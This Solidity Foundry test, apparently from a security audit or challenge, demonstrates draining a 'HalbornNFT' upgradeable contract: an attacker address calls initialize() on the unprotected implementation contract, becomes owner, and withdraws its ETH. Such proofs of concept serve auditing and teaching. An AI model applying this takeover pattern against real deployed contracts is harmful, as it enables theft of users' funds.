// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "openzeppelin-contracts/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {HalbornNFT} from "../src/HalbornNFT.sol";

contract HalbornTestDrain is Test {
    HalbornNFT public nft;
    HalbornNFT public impl;
    address payable public attacker = payable(address(0xdeadbea7));

    function setUp() public {
        impl = new HalbornNFT();
        ERC1967Proxy proxy = new ERC1967Proxy(
            address(impl), 
            abi.encodeWithSignature("initialize(bytes32,uint256)", "", 1 ether)
        );

        nft = HalbornNFT(address(proxy));
    }

    function testDrainProtocol() public {
        vm.deal(address(nft), 1337 ether);

        vm.startPrank(attacker);
        
        // run the initializer on the implementation contract
        // confirm that we are now the owner of the implementation contract
        impl.initialize("", 1 wei);
        assertTrue(impl.owner() == attacker);
    
        uint256 bal = address(impl).balance;
        assertTrue(bal > 0);
        console.log(bal);
        impl.withdrawETH(bal);

        assertTrue(address(attacker).balance > 0);

        vm.stopPrank();
    }
}
